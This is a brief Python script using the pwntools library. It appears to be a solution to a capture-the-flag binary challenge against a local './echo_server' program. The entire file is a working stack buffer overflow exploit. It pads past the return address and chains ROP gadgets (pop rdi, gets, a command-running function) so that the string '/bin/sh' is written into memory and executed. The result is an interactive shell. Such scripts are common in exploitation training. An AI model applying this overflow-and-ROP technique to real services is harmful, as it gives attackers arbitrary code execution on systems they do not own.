from pwn import *
context.arch='amd64'
r=process('./echo_server')
# gadgets
shell=0x601080
runCMD=0x4006c6
gets=0x4005a0
pop_rdi_ret=0x400923
shell=0x601080
padding=b'a'*0x38

#exploit
r.recvlines(7)
s=r.recvuntil(b'>')
print(s)
payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)
r.sendline(payload1)
r.sendline(b'/bin/sh\x00')
r.interactive()
